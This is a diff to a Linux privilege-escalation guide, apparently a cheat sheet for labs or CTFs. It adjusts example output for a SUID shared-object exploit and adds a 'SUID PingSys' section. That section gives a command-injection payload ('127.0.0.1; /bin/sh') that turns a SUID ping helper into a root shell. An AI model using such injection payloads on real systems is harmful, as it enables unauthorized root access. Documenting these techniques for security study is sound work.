@@ -1141,8 +1141,16 @@ When a program is run, it tries to load the shared objects it needs. We may use 
     ```
     $ /usr/local/bin/suid-so
     # id
-    uid=0(root) gid=1000(user) ...
+    uid=0(root) gid=1000(user) ..
     ```
+
+### SUID PingSys
+
+Run the following command on our shell to escalate to a root shell:
+
+```
+/usr/bin/pingsys '127.0.0.1; /bin/sh'
+```
 
 ### PATH Environment Variable
 
